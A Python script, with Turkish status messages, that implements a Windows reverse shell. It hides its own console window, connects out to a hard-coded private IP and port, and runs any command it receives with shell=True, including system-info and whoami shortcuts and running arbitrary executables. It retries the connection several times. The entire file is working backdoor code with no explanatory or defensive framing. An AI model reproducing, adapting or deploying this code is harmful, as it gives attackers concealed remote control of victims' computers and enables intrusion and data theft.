import os
import socket
import subprocess
import time
import logging
import sys
import win32gui
import win32console

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0)

logging.basicConfig(filename='reverse_shell.log', level=logging.DEBUG)

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        return output
    except subprocess.CalledProcessError as error:
        logging.error(error.output)
        return None

def run_exe(exe_path):
    try:
        output = subprocess.check_output(exe_path, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        return output
    except subprocess.CalledProcessError as error:
        logging.error(error.output)
        return None

def reverse_shell(ip, port):
    connection_attempts = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(b'Baglanti basarili!\n')  
            while True:
                command = sock.recv(1024).decode().strip()
                prompt = f'\n{os.getcwd()}\\> '
                sock.send(prompt.encode())
                full_command = command + prompt
                if command.lower() == 'exit':
                 sock.send(b'Baglanti kapandi!\n')
                 sock.close()
                 sys.exit(0)
                elif command.lower() == 'sysinfo':
                 output = run_command('systeminfo')
                 sock.send(output)
                elif command.lower() == 'whoami':
                    output = run_command('whoami')
                    sock.send(output)
                elif command.startswith('run '):
                    exe_path = command.split(' ')[1]
                    output = run_exe(exe_path)
                    sock.send(output)
                     
                else:
                    output = run_command(command)
                    sock.send(output)
        except socket.error:
            connection_attempts += 1
            if connection_attempts == 5: 
                logging.error('5 baganti denemesi basarisiz oldu. Cikiliyor.')
                sys.exit(1)
            time.sleep(5)

if __name__ == '__main__':  

  target_ip = '192.168.20.128'
  target_port = 5555

  reverse_shell(target_ip, target_port)